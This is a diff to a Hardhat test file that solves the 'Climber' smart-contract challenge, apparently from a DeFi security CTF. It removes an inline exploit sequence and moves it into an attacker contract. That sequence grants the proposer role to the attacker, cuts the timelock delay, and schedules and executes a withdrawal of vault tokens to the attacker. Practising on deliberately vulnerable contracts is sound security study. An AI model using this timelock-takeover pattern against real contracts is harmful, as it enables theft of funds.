@@ -753,62 +753,16 @@ describe("[Challenge] Climber", function () {
     // timelock is owner of vault contract
     expect(await this.vault.owner()).to.eq(this.timelock.address);
 
-    let values = [0, 0, 0, 0, 0];
-    const salt = "0x0000000000000000000000009612157E5457e571083CeB9C4c5896e906df1111";
+    // let values = [0, 0, 0, 0, 0];
+    // const salt = "0x0000000000000000000000009612157E5457e571083CeB9C4c5896e906df1111";
 
     // construct ownership change data
-    let target_0 = this.timelock.address;
-    const PROPOSER_ROLE = await this.timelock.PROPOSER_ROLE();
-    const signature_0 = "grantRole(bytes32,address)";
-    const parameters_0 = [PROPOSER_ROLE, this.climberAttack.address];
-    const encodedData_0 = ITimelock.encodeFunctionData(signature_0, parameters_0);
-
-    let target_1 = this.timelock.address;
-    const signature_1 = "grantRole(bytes32,address)";
-    const parameters_1 = [PROPOSER_ROLE, this.timelock.address];
-    const encodedData_1 = ITimelock.encodeFunctionData(signature_1, parameters_1);
-
-    // construct execution to remove time delay
-    let target_2 = this.timelock.address;
-    const signature_2 = "updateDelay(uint64)";
-    const parameters_2 = [1];
-    const encodedData_2 = ITimelock.encodeFunctionData(signature_2, parameters_2);
-
-    // contruct scheduled withdrawa;
-    // let target_3 = this.vault.address;
-    const signature_3 = "withdraw(address,address,uint256)";
-    const parameters_3 = [this.token.address, attacker.address, WITHDRAWAL_LIMIT];
-    //const encodedData_3 = IClimberVault.encodeFunctionData(signature_3, parameters_3);
-
-    let target_4 = this.timelock.address;
-    const signature_4 = "schedule(address[],uint256[],bytes[],bytes32)";
-    const parameters_4 = [
-      [this.vault.address],
-      [0],
-      [IClimberVault.encodeFunctionData(signature_3, parameters_3)],
-      salt,
-    ];
-    const encodedData_4 = ITimelock.encodeFunctionData(signature_4, parameters_4);
-
-    let target_5 = this.timelock.address;
-    const signature_5 = "execute(address[],uint256[],bytes[],bytes32)";
-    const parameters_5 = [
-      [this.vault.address],
-      [0],
-      [IClimberVault.encodeFunctionData(signature_3, parameters_3)],
-      salt,
-    ];
-    const encodedData_5 = ITimelock.encodeFunctionData(signature_5, parameters_5);
-
-    // // Advance time 1 days to bypass time delay.
-    await ethers.provider.send("evm_increaseTime", [15 * 24 * 60 * 60]); // 15 days
-
-    const targets = [target_0, target_1, target_2, target_4, target_5];
-    const encodedData = [encodedData_0, encodedData_1, encodedData_2, encodedData_4, encodedData_5];
-
-    await this.climberAttack.execute(targets, values, encodedData, salt);
-    // expect(await this.timelock.hasRole(PROPOSER_ROLE, this.climberAttack.address)).to.eq(true);
-    // expect(await this.timelock.hasRole(PROPOSER_ROLE, this.timelock.address)).to.eq(true);
+    // let target_0 = this.timelock.address;
+    // const PROPOSER_ROLE = await this.timelock.PROPOSER_ROLE();
+    // const signature_0 = "grantRole(bytes32,address)";
+    // const parameters_0 = [PROPOSER_ROLE, this.climberAttack.address];
+    // const encodedData_0 = ITimelock.encodeFunctionData(signature_0, parameters_0);
+    await this.climberAttack.executeProposal();
   });
 
   after(async function () {
